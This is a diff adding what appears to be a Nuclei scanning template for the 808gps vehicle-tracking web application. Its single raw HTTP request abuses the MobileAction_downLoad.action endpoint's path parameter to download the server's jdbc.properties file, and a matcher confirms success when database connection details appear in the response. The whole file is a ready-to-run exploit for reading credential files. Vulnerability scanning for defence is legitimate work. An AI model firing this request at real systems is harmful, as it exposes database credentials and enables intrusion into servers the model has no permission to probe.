@@ -1,0 +1,23 @@
+id: 808gps-MobileAction_downLoad-filedownload
+info:
+  author: 808gps-MobileAction_downLoad-filedownload
+  name: 808gps-MobileAction_downLoad-filedownload
+requests:
+  - raw:
+      - |
+        GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body,'DATABASE','jdbc.')"
